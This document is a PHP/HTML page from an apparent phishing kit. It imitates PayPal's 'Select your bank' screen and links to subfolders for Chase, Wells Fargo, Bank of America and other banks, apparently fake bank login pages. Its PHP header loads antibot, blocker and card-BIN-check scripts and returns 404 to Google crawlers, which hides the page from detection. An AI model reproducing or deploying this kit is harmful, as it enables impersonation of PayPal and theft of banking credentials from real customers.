

<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");
include("../../system/bincheck.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);



?>


<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="" data-reactid="3"></script>
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>


<link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>


<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >



</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>


<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no">


<title>PayPal : Select your bank</title><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dec/20e7b06d236a51c925e9c2cc70c12/css/app-service-nav.ltr.css"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dec/20e7b06d236a51c925e9c2cc70c12/css/paypal-sans.css"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dec/20e7b06d236a51c925e9c2cc70c12/css/wallet.ltr.css">

<script>

 <script> </script>  <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-7-9-consumer/vx-header-footer.min.css"><!--[if lt IE 9]><script>
</script><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dec/20e7b06d236a51c925e9c2cc70c12/css/ie.ltr.css" />

</script><![endif]-->


</div></div></div>

<label class="vx_globalNav-toggleTrigger_overlay" for="toggleNavigation"></label></div>


<div class="listFABBank overpanel-wrapper row"><div class="col-xs-12">


<a href="#" class="dismiss close nemo_dismissClose" name="close" aria-describedby="overpanel-header" role="button" data-push-replace="false" data-pagename="" data-track-type="link"><span class="icon icon-close-small" aria-hidden="true"></span><span class="accessAid">Close</span>
<br>
</a></div><div class=" overpanel-content maxOverpanelWidth" role="document"><div id="overpanel-header" class=" overpanel-header"><h2 id="overpanel-header">Select your bank</h2></div><div class=" overpanel-body"><ul class="listBanks"><li class="pull-left"><a href="./bank-Of-America/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger bankOfAmerica nemo_bankOfAmerica_2931" tab-index="1" data-attr="2931" data-push-replace="false"><span class="accessAid">Bank of America</span></a></li><li class="pull-left"><a href="./new/" data-pagename="" class="manualAddBank icon icon-arrow-right-small logo-bigger capitalOne" data-attr="00" data-push-replace="false"><span class="accessAid">Capital One</span></a></li><li class="pull-left"><a href="./chase/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger chase nemo_chase_663" tab-index="1" data-attr="663" data-push-replace="false"><span class="accessAid">Chase Bank</span></a></li><li class="pull-left"><a href="./new/" data-pagename="" class="manualAddBank icon icon-arrow-right-small logo-bigger citiBank" data-attr="00" data-push-replace="false"><span class="accessAid">CitiBank</span></a></li><li class="pull-left"><a href="./fifth-Third-Bank/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger fifthThirdBank nemo_fifthThirdBank_765" tab-index="1" data-attr="765" data-push-replace="false"><span class="accessAid">Fifth Third Bank</span></a></li><li class="pull-left"><a href="./huntington/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger huntington nemo_huntington_802" tab-index="1" data-attr="802" data-push-replace="false"><span class="accessAid">Huntington Bank (Personal)</span></a></li><li class="pull-left"><a href="./pnc/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger pnc nemo_pnc_2199" tab-index="1" data-attr="2199" data-push-replace="false"><span class="accessAid">PNC Bank</span></a></li><li class="pull-left"><a href="./regions/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger regions nemo_regions_803" tab-index="1" data-attr="803" data-push-replace="false"><span class="accessAid">Regions Bank</span></a></li><li class="pull-left"><a href="./new/" data-pagename="" class="manualAddBank icon icon-arrow-right-small logo-bigger sunTrust" data-attr="00" data-push-replace="false"><span class="accessAid">SunTrust Bank</span></a></li><li class="pull-left"><a href="./td-Bank/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger tdBank nemo_tdBank_9210" tab-index="1" data-attr="9210" data-push-replace="false"><span class="accessAid">TD Bank</span></a></li><li class="pull-left"><a href="./us-Bank/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger usBank nemo_usBank_545" tab-index="1" data-attr="545" data-push-replace="false"><span class="accessAid">US Bank</span></a></li><li class="pull-left"><a href="./usaa/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger usaa nemo_usaa_3472" tab-index="1" data-attr="3472" data-push-replace="false"><span class="accessAid">USAA Bank</span></a></li><li class="pull-left"><a href="./wells-Fargo/" data-pagename="" class="bankLogin icon icon-arrow-right-small logo-bigger wellsFargo nemo_wellsFargo_5" tab-index="1" data-attr="5" data-push-replace="false"><span class="accessAid">Wells Fargo Bank</span></a></li>

<li class="pull-left"><a name="manualAddBank" class="logo-bigger generic nemo_different_add_bank" href="./new/" data-pagename=""><span class="bankNameText">I have a different bank</span></a></li>


<li class="pull-left"><a name="manualAddBank" class="logo-bigger generic nemo_different_add_bank" href="../uploads/" data-pagename=""><span class="bankNameText">cleas x</span></a></li>

</ul></div></div></div></section><section id="fullscreentooltip"></section><div id="alertDialogs" class="alertDialogs"><div id="autoInitiateConfirmBank" class="alert autoInitiateConfirmBank hide" role="dialog" aria-labelledby="heading-icon-info-large-autoInitiateConfirmBank" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>You'll need to check your bank account in 2-3 business days for the exact deposit amounts (less than $1.00 USD).</p><p>Then log in to your PayPal account, go to your wallet, and confirm the bank account by entering the 2 deposit amounts.</p><a href="#" class="ok yes vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="deleteBank" class="alert deleteBank hide" role="dialog" aria-labelledby="heading-icon-info-large-deleteBank" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Are you sure you want to remove this account from your wallet?</p><div class="vx_btn-group twoUp"><a href="#" class="no vx_btn vx_btn-small vx_btn-secondary actionBtn" role="button" data-pagename="" data-pagename2="">Cancel</a><a href="#" class="yes vx_btn vx_btn-small vx_btn-primary actionBtn" role="button" data-pagename="" data-pagename2="">Remove</a></div></div></div></div><div id="deleteCard" class="alert deleteCard hide" role="dialog" aria-labelledby="heading-icon-info-large-deleteCard" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Any pending payments on this card will be processed even after you remove it. Are you sure you want to remove this card?</p><div class="vx_btn-group twoUp"><a href="#" class="no vx_btn vx_btn-small vx_btn-secondary actionBtn" role="button" data-pagename="" data-pagename2="">Cancel</a><a href="#" class="yes vx_btn vx_btn-small vx_btn-primary actionBtn" role="button" data-pagename="" data-pagename2="">Remove</a></div></div></div></div><div id="unableToAddCard" class="alert unableToAddCard hide" role="dialog" aria-labelledby="heading-icon-info-large-unableToAddCard" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>We're sorry, we can't retrieve your card data right now. Please try again later.</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="meetMaxCard" class="alert meetMaxCard hide" role="dialog" aria-labelledby="heading-icon-info-large-meetMaxCard" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Sorry, there's a limit to how many cards you can link to your account. To link this card, please remove a card first.</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="meetMaxBank" class="alert meetMaxBank hide" role="dialog" aria-labelledby="heading-icon-info-large-meetMaxBank" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Sorry, there's a limit to how many banks you can link to your account. To link this bank, please remove a bank account first</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="newDepositsRequested" class="alert newDepositsRequested hide" role="dialog" aria-labelledby="heading-icon-positive-large-newDepositsRequested" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-positive-large"></div><p>New deposits requested. Check your bank account in 2-3 business days for the exact amounts and enter their deposit amounts.</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="newCodeRequested" class="alert newCodeRequested hide" role="dialog" aria-labelledby="heading-icon-positive-large-newCodeRequested" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-positive-large"></div><p>The new confirmation code you requested is in process.  Check your bank account within 24 hours and enter the 4-digit code on the Wallet page.</p><a href="#" class="ok yes vx_btn vx_btn-primary" role="button">OK</a></div></div></div><div id="deleteAuthorizationConfirm" class="alert deleteAuthorizationConfirm hide" role="dialog" aria-labelledby="heading-icon-info-large-deleteAuthorizationConfirm" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Are you sure you want to delete this?</p><p>If you delete your direct debit authorization, you�ll no longer be able to make PayPal payments using your bank account.</p><div class="vx_btn-group twoUp"><a href="#" class="no vx_btn vx_btn-small vx_btn-secondary actionBtn" role="button" data-pagename="" data-pagename2="">Go Back</a><a href="#" class="yes vx_btn vx_btn-small vx_btn-primary actionBtn" role="button" data-pagename="" data-pagename2="">Delete Authorization</a></div></div></div></div><div id="promptClassicServices" class="alert promptClassicServices hide" role="dialog" aria-labelledby="heading-icon-info-large-promptClassicServices" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>We recommend using a non-mobile device to access the forms needed to authorize this service, because the forms will need to be printed and mailed.</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">Go Back</a></div></div></div><div id="confirmSkipDDI" class="alert confirmSkipDDI hide" role="dialog" aria-labelledby="heading-icon-info-large-confirmSkipDDI" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>If you don't want to submit the Instruction, you'll still be able to withdraw money from PayPal to your bank account. However, you won't have the flexibility of paying from your bank account at checkout, and you won't be able to send money to your friends and family in the UK for free.</p><div class="vx_btn-group twoUp"><a href="#" class="no vx_btn vx_btn-small vx_btn-secondary actionBtn" role="button" data-pagename="" data-pagename2="">Back</a><a href="#" class="yes vx_btn vx_btn-small vx_btn-primary actionBtn" role="button" data-pagename="" data-pagename2="">Skip Instruction</a></div></div></div></div><div id="deleteGiftCard" class="alert deleteGiftCard hide" role="dialog" aria-labelledby="heading-icon-info-large-deleteGiftCard" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Are you sure you want to remove this Gift Card from your wallet?</p><div class="vx_btn-group twoUp"><a href="#" class="no vx_btn vx_btn-small vx_btn-secondary actionBtn" role="button" data-pagename="" data-pagename2="">Cancel</a><a href="#" class="yes vx_btn vx_btn-small vx_btn-primary actionBtn" role="button" data-pagename="" data-pagename2="">Remove</a></div></div></div></div><div id="cantDeleteBank" class="alert cantDeleteBank hide" role="dialog" aria-labelledby="heading-icon-info-large-cantDeleteBank" tabindex="-1"><div role="document"><div class="alertDialog"><div class="alertDialog-icon icon icon-info-large"></div><p>Sorry, there's a limit to how many cards you can link to your account. To link this card, please remove a card first.</p><a href="#" class="ok no vx_btn vx_btn-primary" role="button">OK</a></div></div></div></div><section id="js_ajaxErrorOverpanel" class="theoverpanel animated med hide" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="true"></section><script type="text/javascript" src=""></script><script type="text/javascript"></script><noscript></noscript>

<div style="position: absolute; top: 0px;"></div><script type="text/javascript"></script>


</body></html>

